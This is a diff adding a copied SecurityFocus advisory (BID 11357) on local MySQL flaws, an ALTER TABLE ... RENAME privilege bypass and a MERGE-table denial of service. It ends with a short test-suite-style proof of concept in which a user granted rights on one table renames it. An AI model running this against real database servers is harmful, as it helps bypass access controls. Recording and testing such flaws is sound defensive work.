@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/11357/info
+
+MySQL is reported prone to multiple local vulnerabilities. Exploiting these issues may allow an attacker to bypass security restrictions or cause a denial-of-service condition in the application. 
+
+Rportedly, an attacker can bypass certain security restrictions and gain access to and corrupt potentially sensitive data due to an error in 'ALTER TABLE ... RENAME' operations. 
+
+A denial-of-service condition occurs when multiple threads ALTER MERGE tables to change the UNION. 
+
+Due to a lack of details, further information is not available at the moment. This BID will be updated as more information becomes available.
+
+drop database if exists mysqltest; 
+connect (root,localhost,root,,test,0,mysql-master.sock); 
+connection root; 
+--disable_warnings 
+create database if not exists mysqltest; 
+--enable_warnings 
+create table mysqltest.t1 (a int,b int,c int); 
+grant all on mysqltest.t1 to mysqltest_1@localhost; 
+connect (user1,localhost,mysqltest_1,,mysqltest,0,mysql-master.sock); 
+connection user1; 
+alter table t1 rename t2;
